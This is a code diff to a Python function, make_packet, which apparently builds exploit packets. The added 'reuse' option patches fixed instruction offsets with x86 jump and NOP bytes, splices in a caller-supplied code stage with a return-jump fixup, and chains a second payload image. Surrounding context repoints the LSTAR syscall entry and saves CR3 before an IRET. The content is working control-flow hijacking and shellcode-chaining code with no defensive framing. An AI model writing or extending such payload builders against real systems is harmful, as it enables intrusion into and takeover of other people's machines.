@@ -13,7 +13,8 @@ from sbef_probe_cases import SBEF_OFFSET
 EXTERNAL_ADDRESS = 0x2000000
 
 
-def make_packet(reference, image, desktop_present=None, session_gate=None, external=None, *, engine=False):
+def make_packet(reference, image, desktop_present=None, session_gate=None, external=None, *, engine=False,
+                reuse=None):
     if external is not None:
         if session_gate is None:
             raise ValueError('El cargador externo requiere el perfil de sesion')
@@ -59,6 +60,22 @@ def make_packet(reference, image, desktop_present=None, session_gate=None, exter
         packet[at:at+6] = b'\xe9' + struct.pack('<i', len(packet) - at - 5) + b'\x90'
         packet.extend(desktop_present)
         packet.extend(b'\xe9' + struct.pack('<i', 24 + 895 - len(packet) - 5))
+    if reuse is not None:
+        code, second = reuse
+        second_packet, second_info = make_packet(reference, second)
+        if second_info['fault_rip'] != fault_rip or image == second:
+            raise ValueError('Reuso ABI requiere dos clientes distintos con el mismo terminal')
+        at = 24 + 889
+        if packet[at:at+6] != bytes.fromhex('41bc01000000'):
+            raise ValueError('Cambio el terminal ABI')
+        packet[at:at+6] = b'\xe9' + struct.pack('<i', len(packet) - at - 5) + b'\x90'
+        # The fixed stage ends immediately before its second SBEF.
+        # A return jump is stored after the stage and before the second SBEF.
+        if code[-5:] != b'\xe9\x00\x00\x00\x00':
+            raise ValueError('Falta el salto de retorno de reuso ABI')
+        packet.extend(code[:-4])
+        packet.extend(struct.pack('<i', 24 + 895 - len(packet) - 4))
+        packet.extend(second_packet[SBEF_OFFSET:])
     if session_gate is not None:
         # Repoint LSTAR and save the bridge CR3/context before the first IRET.
         at = 24 + 677
@@ -93,7 +110,8 @@ def make_packet(reference, image, desktop_present=None, session_gate=None, exter
     struct.pack_into('<I', packet, 16, sum(packet[24:]))
     return bytes(packet), dict(fault_rip=fault_rip, sbef_bytes=len(image),
                                sbef_sha256=hashlib.sha256(image).hexdigest(),
-                               desktop=desktop_present is not None, session=session_gate is not None)
+                               desktop=desktop_present is not None, session=session_gate is not None,
+                               reuse=reuse is not None)
 
 
 def prepend_intro(packet, splash):
